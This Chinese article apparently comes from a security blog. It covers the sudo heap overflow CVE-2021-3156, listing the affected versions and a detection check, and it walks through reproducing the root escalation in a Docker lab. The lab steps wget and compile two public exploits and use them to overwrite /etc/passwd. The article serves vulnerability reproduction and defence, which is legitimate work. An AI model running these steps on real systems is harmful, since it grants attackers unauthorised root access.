> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/fiV8_QLBBFJ6wcVaVgSGuw)

1. 漏洞简介
=======

1 月 26 日，Sudo 发布安全通告，修复了一个类 Unix 操作系统在命令参数中转义反斜杠时存在基于堆的缓冲区溢出漏洞。当 sudo 通过 -s 或 -i 命令行选项在 shell 模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用 -s 或 -i 标志运行 sudoedit 时，实际上并未进行转义，从而可能导致缓冲区溢出。因此只要存在 sudoers 文件（通常是 /etc/sudoers），攻击者就可以使用本地普通用户利用 sudo 获得系统 root 权限。目前漏洞细节已公开，请受影响的用户尽快采取措施进行防护。

2. 影响范围
=======

Sudo 1.8.2 - 1.8.31p2  
Sudo 1.9.0 - 1.9.5p1  
不受影响版本：sudo =>1.9.5p2

3. 检测方法
=======

非 root 执行`sudoedit -s /`  
若返回以 “sudoedit：” 开头的错误，则当前系统可能存在安全风险。  
![](https://mmbiz.qpic.cn/mmbiz_png/rm5v4tsm2fSUblHNDJaStP7IE0tMI4nFCTmVEbejl0vuC4g3zZgtSdMlruRshRBOCK8qjOjTgYvr8icB7aT2GaQ/640?wx_fmt=png)

不受影响的系统将显示以 “usage：” 开头的错误

4. 利用复现
=======

4.0 测试环境搭建 docker-ubuntu.20.4+sudo-1.8.31
-----------------------------------------

docker 拉环境  
`docker pull manishfoodtechs/xfcefulldesktop_ubuntu20.4`  
`docker run -it manishfoodtechs/xfcefulldesktop_ubuntu20.4 /bin/bash`  
sudo 版本  
`sudo --version`  
![](https://mmbiz.qpic.cn/mmbiz_png/rm5v4tsm2fSUblHNDJaStP7IE0tMI4nFNJFBQ5q47vOHot4yZewoxiaTBOYbr1S89ww270dzSJV2hsSY3BxPEoQ/640?wx_fmt=png)

系统版本  
`lsb_release -a`  
![](https://mmbiz.qpic.cn/mmbiz_png/rm5v4tsm2fSUblHNDJaStP7IE0tMI4nFa5NgQdhP7CkOCEXPWeB9KlQGiaXcG7WllQhL6lxoY523dUOzctqsVZA/640?wx_fmt=png)

新建 test 测试用户  
`useradd test`  
`passwd test`

4.1 stong 的 exp
---------------

https://github.com/stong/CVE-2021-3156

`su test`  
`cd /tmp`  
宿主机下 poc，python 起 http 服务分享给测试环境  
`git clone https://github.com/stong/CVE-2021-3156.git`  
`python3 -m http.server 80`  
docker 内下载宿主机分享的`exploit.c`  
`wget http://192.168.146.231/exploit.c`  
`gcc ./exploit.c`  
![](https://mmbiz.qpic.cn/mmbiz_png/rm5v4tsm2fSUblHNDJaStP7IE0tMI4nFS8nXZaz5JEuX3yV9M5hvTg4RKZtZ2ehuVjaG1O1wR6dkxtLuFam6nA/640?wx_fmt=png)

`cp /etc/passwd kanpasswd`  
把 kanpasswd 中的 test 用户 id 和组 id 换为 0  
`vim kanpasswd`  
![](https://mmbiz.qpic.cn/mmbiz_png/rm5v4tsm2fSUblHNDJaStP7IE0tMI4nFfHqhia0fevq2CtRbW5PzqlckicGx269icHnf5KOic5ZgxXzliaMQ70okJGw/640?wx_fmt=png)

`./a.out /etc/passwd kanpasswd`  
![](https://mmbiz.qpic.cn/mmbiz_png/rm5v4tsm2fSUblHNDJaStP7IE0tMI4nFjpCr4aB8HXUgey9dAu38HKhFPYFog4vGkjDQfzKt2kOyw1vTKzTdEw/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/mmbiz_png/rm5v4tsm2fSUblHNDJaStP7IE0tMI4nFRLIhhcKg5J8ZIG6ayDibBNG373WoR1GbzJEH0wfK7rWFkklZXXrd6Gg/640?wx_fmt=png)

在重新看 passwd，已经被修改了  
`cat /etc/passwd`  
![](https://mmbiz.qpic.cn/mmbiz_png/rm5v4tsm2fSUblHNDJaStP7IE0tMI4nFT1xLeYOOuoLLdueXZrrfcCvQIE9TTQrMOkgyjXWibGOhLLlVTYqNBgQ/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/mmbiz_png/rm5v4tsm2fSUblHNDJaStP7IE0tMI4nFqujBB8SELEz4hg1KUWlPGibT8hiaJh3oTmMd2PwXuAOMeHib7UdJqqKtg/640?wx_fmt=png)

需要 su 再重新切换至 test，此时 id 显示已提权，有权限看 shadow  
`su test`  
![](https://mmbiz.qpic.cn/mmbiz_png/rm5v4tsm2fSUblHNDJaStP7IE0tMI4nFDgCgXeO6PLxxSUqF7ia9dbcib2sdK2lZk8MAfibmwLkEicW6Xhdt6n4Z7A/640?wx_fmt=png)

4.2 haxx.in 的 exp
-----------------

https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz

`su test`  
`cd /tmp`  
`wget https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz`  
`tar xvf CVE-2021-3156_nss_poc_ubuntu.tar.gz`  
`cd CVE-2021-3156`  
`make`  
![](https://mmbiz.qpic.cn/mmbiz_png/rm5v4tsm2fSUblHNDJaStP7IE0tMI4nF304nzchbBjp5jDRRGibibY9KwL6HVqvCLgfpDicdqPfg0ZLvqao0rtPyw/640?wx_fmt=png)

`./sudo-hax-me-a-sandwich`  
![](https://mmbiz.qpic.cn/mmbiz_png/rm5v4tsm2fSUblHNDJaStP7IE0tMI4nFtRWNn1NFTXibUPFZkld58R3YMQTrbQW2rSdNecWO92tsibOVdYa0wnpg/640?wx_fmt=png)

`id`  
`./sudo-hax-me-a-sandwich 0`  
![](https://mmbiz.qpic.cn/mmbiz_png/rm5v4tsm2fSUblHNDJaStP7IE0tMI4nFKGXRzUtnjm2Yy0rCBYiaRVaA54IYmKvWmpv2Viao85cONOOeCdGTGoJA/640?wx_fmt=png)

5. 参考
=====

[https://mp.weixin.qq.com/s/x9Q4xsoEGsK1Kv_1AbHxaQ](https://mp.weixin.qq.com/s?__biz=MzIzNjE4MTE0OA==&mid=2247484247&idx=1&sn=be2881c09da67ab5f88eb49d9a0e852f&scene=21#wechat_redirect)  
https://xie1997.blog.csdn.net/article/details/113268374  
[https://mp.weixin.qq.com/s/IzmWZojdkorKc5qGu01Jcw](https://mp.weixin.qq.com/s?__biz=MzIzOTIwNjczNw==&mid=2247483996&idx=1&sn=e1b7b3c9d67cc0623cfde5558f74be6a&scene=21#wechat_redirect)